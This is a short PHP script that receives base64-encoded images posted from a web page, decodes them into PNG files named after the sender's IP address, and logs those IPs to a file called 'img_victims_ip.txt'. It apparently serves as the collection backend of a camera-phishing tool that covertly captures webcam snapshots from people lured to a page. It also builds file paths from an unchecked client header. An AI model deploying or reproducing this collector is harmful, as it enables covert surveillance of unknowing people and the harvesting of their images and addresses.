<?php
//main variables
//by Ahmad Allam
//my telegram @echo_me
mkdir("All_images", 0777, true);
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
$date = date('is');
$imageData=$_POST['cat'];

if (!empty($_POST['cat'])) {
error_log("Received" ."$ip". "\r\n", 3, "All_images/img_victims_ip.txt");

}

$filteredData=substr($imageData, strpos($imageData, ",")+1);
$unencodedData=base64_decode($filteredData);
$fp = fopen( 'All_images/A_'.$ip."_".$date.'.png', 'wb' );
fwrite( $fp, $unencodedData);
fclose( $fp );

exit();
?>

